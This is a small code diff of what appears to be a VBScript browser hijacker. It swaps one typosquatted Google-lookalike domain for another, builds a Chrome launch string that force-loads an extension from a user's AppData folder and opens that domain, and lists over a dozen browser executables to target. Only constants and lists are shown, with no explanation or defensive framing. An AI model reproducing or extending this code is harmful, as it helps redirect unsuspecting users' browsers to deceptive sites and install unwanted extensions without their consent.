@@ -1,6 +1,6 @@
 Dim objFS:Set objFS = CreateObject("Scripting.FileSystemObject")
 On Error Resume Next
-Const link = "http://9o0gle.com/"
+Const link = "http://9oogle.com/"
 Const linkChrome = " --load-extension=""C:\Users\{username}1\AppData\Local\kemgadeojglibflomicgnfeopkdfflnk"" http://9o0gle.com/"
 browsers = Array("IEXPLORE.EXE", "firefox.exe", "360SE.exe", "SogouExplorer.exe", "opera.exe", "Safari.exe", "Maxthon.exe", "TTraveler.exe", "TheWorld.exe", "baidubrowser.exe", "liebao.exe", "QQBrowser.exe","chrome.exe","360chrome.exe")
 ChromeBrowsers = Array("chrome.exe","360chrome.exe")
